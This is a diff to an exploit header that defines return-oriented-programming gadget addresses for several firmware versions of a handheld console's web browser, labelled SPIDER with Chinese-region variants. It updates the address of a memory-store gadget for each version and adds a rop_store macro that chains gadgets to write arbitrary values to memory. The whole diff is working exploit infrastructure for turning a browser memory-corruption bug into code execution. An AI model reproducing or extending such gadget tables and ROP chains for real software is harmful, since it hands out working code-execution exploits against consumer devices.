@@ -91,7 +91,8 @@
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00103DA8
 	#define POP_R4_LR_BX_R2			0x00100C8C
 	#define SP_LR_LDMFD_SP_LR_PC		0x002D6A30
-	#define STR_R1_0_POP_R4_PC		0x0016F3FC
+	#define STR_R1_0_POP_R4_PC		0x00119B94
+//	#define STR_R1_0_POP_R4_PC		0x0016F3FC
 	#define SVC_0A_BX_LR			0x002A513C
 	#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x00332BE8
 	#define IFile_Open_LDMFD_SP_R4_5_6_7_PC	0x0025B0A4
@@ -121,6 +122,7 @@
 	#define POP_R1_2_3_PC			0x00103DC8
 	#define POP_R4_5_6_PC			0x0010014C //CN?
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x00106598
+	#define STR_R1_0_POP_R4_PC		0x00106684
 	#if defined(SPIDER_42_CN) //1.7538.CN FW4.2
 		#define	HANDLE_PTR			0x003D9704
 		#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD1C
@@ -200,6 +202,7 @@
 	#define POP_R3_PC			0x00105104
 //	#define POP_R4_5_6_PC			0x?
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C8
+	#define STR_R1_0_POP_R4_PC		0x001066B4
 	#define	HANDLE_PTR			0x003D9704
 	#define GSPGPU_FlushDataCache_LDMFD_SP_R4_5_6_PC	0x0012BD30 
 	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D6C40
@@ -230,6 +233,7 @@
 	#define POP_R4_5_6_PC			0x0010014C
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065C4
 //	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x0010CC4C
+	#define STR_R1_0_POP_R4_PC		0x001066B0
 	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
 	#if defined(SPIDER_5X_CN) //1.7552.CN
 		#define	HANDLE_PTR			0x003DA70C
@@ -309,7 +313,6 @@
 		#define POP_R2_3_4_PC			0x001007B4
 		#define POP_R4_PC			0x0010510C
 		#define SP_LR_LDMFD_SP_LR_PC		0x001303A0
-		#define STR_R1_0_POP_R4_PC		0x001066B0
 		#define SVC_0A_BX_LR			0x0010420C
 		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA28
 		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FE44
@@ -335,6 +338,7 @@
 	#define POP_R3_PC			0x001050E8
 	#define POP_R4_5_6_PC			0x0010014C
 	#define POP_R4_5_6_7_8_9_10_11_12_PC	0x001065A8
+	#define STR_R1_0_POP_R4_PC		0x00106694
 	#define nn__gxlow__CTR__detail__GetInterruptReceiver	0x003D7C40
 	#if defined(SPIDER_9X_CN) //1.7567.CN
 		#define	HANDLE_PTR			0x003DA70C
@@ -414,7 +418,6 @@
 		#define POP_R2_3_4_PC			0x001007B4
 		#define POP_R4_PC			0x001050F0
 		#define SP_LR_LDMFD_SP_LR_PC		0x00130358
-		#define STR_R1_0_POP_R4_PC		0x00106694
 		#define SVC_0A_BX_LR			0x001041F8
 		#define FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC	0x0019CA30
 		#define IFile_Open_LDMFD_SP_R4_5_6_7_8_PC	0x0022FE08
@@ -487,3 +490,4 @@
 #endif
 #define rop_jump(address)		.word POP_R4_5_6_7_8_9_10_11_12_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, POP_PC, LDMFD_SP_R4_5_6_LR_BX_R12, GARBAGE, GARBAGE, GARBAGE, address-4, SP_LR_LDMFD_SP_LR_PC
 #define rop_jump_arm			.word CODE_ENTRY
+#define rop_store(addr, val)		.word POP_R0_PC, addr, POP_R1_PC, val, STR_R1_0_POP_R4_PC, GARBAGE
